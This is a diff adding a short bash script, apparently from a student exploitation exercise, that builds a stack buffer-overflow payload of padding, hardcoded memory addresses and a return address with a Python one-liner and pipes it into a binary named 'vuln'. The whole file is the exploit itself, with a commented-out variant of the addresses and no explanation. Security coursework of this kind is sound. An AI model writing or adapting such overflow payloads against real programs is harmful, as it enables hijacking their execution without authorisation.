@@ -1,0 +1,7 @@
+#!/usr/bin/env bash
+
+#\x01\x01\x01\x01
+buf=$(python -c "print('a'*170 + '\xe4\x88\xff\x43' + 'pp' + 'a'*170 + '' + '\x30\xb3\xe5\xe0' + '\x60\xb1\x04\x08' + '\x01')")
+#'\x01\x00\x00\x00' + '\xe0\xdd\xff\xff')")
+
+echo -en $buf | /task1/s1853050/vuln
